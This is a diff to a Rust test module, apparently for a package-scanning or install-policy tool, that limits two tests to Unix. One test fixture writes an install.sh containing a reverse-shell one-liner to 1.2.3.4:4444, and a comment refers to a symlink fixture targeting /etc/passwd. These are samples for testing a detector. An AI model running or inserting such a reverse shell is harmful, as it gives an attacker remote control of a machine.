@@ -351,6 +351,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(unix)] // the symlink-escape fixture points at /etc/passwd
     fn dangerous_and_caution_findings() {
         let d = tmp("bad");
         std::fs::write(d.join("install.sh"), "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n").unwrap();
@@ -386,6 +387,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(unix)] // the policy commands are `sh -c` one-liners
     fn install_policy_command_decides_and_fails_closed() {
         let allow = vec!["sh".to_string(), "-c".into(), "cat >/dev/null; echo '{\"decision\":\"allow\"}'".into()];
         assert!(install_policy(&allow, &json!({"targetName": "p"}), std::time::Duration::from_secs(5)).is_ok());
